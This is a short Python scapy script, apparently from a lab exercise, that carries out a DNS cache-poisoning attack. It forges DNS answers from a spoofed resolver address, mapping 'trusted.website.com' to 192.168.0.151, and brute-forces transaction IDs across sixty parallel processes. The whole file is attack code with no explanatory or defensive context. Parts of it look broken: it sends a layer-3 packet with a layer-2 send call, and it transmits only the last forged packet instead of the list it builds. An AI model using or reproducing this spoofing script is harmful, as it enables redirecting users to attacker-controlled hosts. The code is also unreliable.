from scapy.all import *
import multiprocessing as mp

src_ip="192.168.0.100"
dst_ip="192.168.0.200"

src_port=53
dst_port=6666

#precompute standard object
message=IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)
dns=DNS(id=1, qr=1, aa=1, qd=1, an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151"))

#list of messages
pkt_list = []

def attack(start, end):
	for i in range (start,end,1):
		#update the qid and add to the list
		dns.id = i
		pkt_list.append(message/dns)
	
	#send all the messages in one solution
	sendp(message/dns)
	print("Done")


if __name__ == "__main__":
	mp.set_start_method('spawn')
	for i in range(0,60,1):
		mp.Process(target=attack, args=((i*1000), (i+1)*1000)).start()
